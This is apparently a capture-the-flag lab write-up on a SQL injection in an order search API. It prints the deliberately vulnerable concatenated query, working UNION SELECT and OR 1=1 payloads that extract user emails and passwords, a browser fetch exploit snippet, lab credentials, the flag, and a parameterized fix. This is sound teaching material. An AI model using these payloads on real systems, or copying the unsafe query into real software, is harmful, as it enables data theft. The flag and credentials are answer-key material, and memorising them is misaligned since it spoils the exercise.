# SQL Injection

## Overview

This vulnerability demonstrates a critical security flaw where user input is directly concatenated into SQL queries without proper sanitization or parameterization. In this case, the order search feature allows users to filter their orders by status, but the status parameter is inserted directly into the SQL query string, enabling attackers to manipulate the query structure and retrieve unauthorized data.

## Why This Is Dangerous

### Direct String Concatenation in SQL Queries

When an application constructs SQL queries by directly concatenating user input into the query string, it creates a fundamental security vulnerability:

1. **Query manipulation** - Attackers can break out of the intended query structure using SQL syntax
2. **Data extraction** - Malicious queries can retrieve data from any table the database user has access to
3. **Bypass authorization** - SQL injection can bypass application-level access controls
4. **Information disclosure** - Attackers can extract sensitive information including flags, user credentials, and other confidential data

## The Vulnerability

In this application, the order search endpoint (`/api/orders/search`) constructs SQL queries by directly concatenating the user-provided status parameter into the query string. The status parameter is optional - when omitted, all orders are returned, but when provided, it's inserted directly into the query without sanitization:

```typescript
const statusFilter =
  status && typeof status === "string" ? `AND o.status = '${status}'` : "";

const query = `
  SELECT 
    o.id,
    o.total,
    o.status,
    o."userId",
    a.street,
    a.city,
    a.state,
    a."zipCode",
    a.country
  FROM orders o
  INNER JOIN addresses a ON o."addressId" = a.id
  WHERE o."userId" = '${user.id}' ${statusFilter}
  ORDER BY o.id DESC
`;

const results = await prisma.$queryRawUnsafe(query);
```

The `status` parameter is inserted directly into the query without any sanitization or parameterization. Even though the frontend filters orders client-side, the API endpoint still accepts the status parameter and constructs the SQL query unsafely. This allows an attacker to:

1. Break out of the intended query structure using SQL syntax (single quotes, semicolons, etc.)
2. Use UNION SELECT to retrieve data from other tables

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{sql_1nj3ct10n_vuln3r4b1l1ty}`, you need to exploit the SQL injection vulnerability:

**Exploitation Steps:**

1. Log in to the application (e.g., as alice@example.com / iloveduck)
2. Navigate to the Order Search page (`/orders/search`)
   - Note: The page automatically loads all orders on page load. The status filter works client-side, but the API endpoint is still vulnerable.
3. Open the browser's developer console (F12) and navigate to the Network tab
4. Find the initial POST request to `/api/orders/search` that was made when the page loaded (it will have an empty body `{}` or no status parameter)
5. Right-click on the request and select "Edit and Resend", or use a proxy like Burp Suite to intercept and modify the request, or send it directly using Postman
6. Modify the request payload to include a SQL injection payload in the `status` field:

   ```json
   {
     "status": "DELIVERED' UNION SELECT id, email, password, role, addressId, id, email, password, role FROM users--"
   }
   ```

7. Send the modified request
8. The application detects the SQL injection attempt and automatically returns the flag in the response

**Alternative Exploitation Method:**

You can also intercept and modify the request programmatically:

1. Open the browser's developer console (F12)
2. Navigate to the Console tab
3. Execute the following JavaScript to send a malicious request:
   ```javascript
   const token = localStorage.getItem("authToken");
   fetch("/api/orders/search", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
       Authorization: `Bearer ${token}`,
     },
     body: JSON.stringify({ status: "DELIVERED' OR 1=1--" }),
   })
     .then((r) => r.json())
     .then((data) => console.log(data));
   ```
4. Check the response - it will include the flag in the `flag` field when SQL injection is detected

### Secure Implementation

```typescript
// ❌ VULNERABLE - Direct string concatenation
const statusFilter =
  status && typeof status === "string" ? `AND o.status = '${status}'` : "";

const query = `
  SELECT * FROM orders
  WHERE userId = '${user.id}' ${statusFilter}
`;
const results = await prisma.$queryRawUnsafe(query);

// ✅ SECURE - Parameterized query
const results = await prisma.order.findMany({
  where: {
    userId: user.id,
    status: status,
  },
  include: {
    address: true,
  },
});
```

## References

- [OWASP Top 10 - Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)

## Flag

The flag for this vulnerability is: **OSS{sql_1nj3ct10n_vuln3r4b1l1ty}**

The flag is automatically returned by the API when a SQL injection attempt is detected in the order search feature. Any SQL injection payload (containing keywords like `UNION`, `SELECT`, `OR 1=1`, `--`, etc.) will trigger the detection and return the flag. The application specifically blocks direct access to the `flags` table through SQL injection to prevent retrieving all flags at once.
